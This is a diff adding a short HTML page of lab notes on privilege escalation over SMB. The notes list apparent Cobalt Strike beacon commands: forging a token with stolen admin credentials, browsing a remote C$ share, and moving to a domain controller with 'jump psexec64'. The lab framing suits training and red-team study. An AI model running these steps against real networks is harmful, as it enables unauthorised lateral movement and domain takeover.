@@ -1,0 +1,19 @@
+<!DOCTYPE html  PUBLIC '-//W3C//DTD XHTML 1.0 Transitional//EN'  'http://www.w3.org/TR/xhtml1/DTD/xhtml1-transitional.dtd'><html xmlns="http://www.w3.org/1999/xhtml">
+<head>
+<meta content="text/html; charset=utf-8" http-equiv="Content-Type"/>
+<title>Privilege Escalation via SMB</title>
+</head><body><b><span style="font-size: 16pt">in our lab we have:</span></b><span style="font-size: 16pt"><ul><b><li style="list-style-type: none">successfully extracted hashes</li>
+</b><li style="list-style-type: none"><b>hashed an admin credential</b></li>
+<li style="list-style-type: none"/>
+<li style="list-style-type: none"/>
+</ul>
+Making a token for our user<br/>
+</span><span style="font-size: 14pt"><u>beacon</u>&gt; help make_token<ul><li style="list-style-type: none">Use: make_token [DOMAIN\user] [password]</li>
+<li style="list-style-type: none"/>
+<li style="list-style-type: none">check privs</li>
+<li style="list-style-type: none"/>
+</ul>
+<u>beacon</u>&gt; ls \\hostname\c$<br/>
+<u><br/>
+</u></span><span style="font-size: 16pt"><b>Attempting to use psexec to establish beacon for Admin user</b></span><u><span style="font-size: 14pt"><br/>
+</span></u><span style="font-size: 14pt"><u>beacon</u>&gt; jump psexec64 domaincontroller SMB</span></body></html>
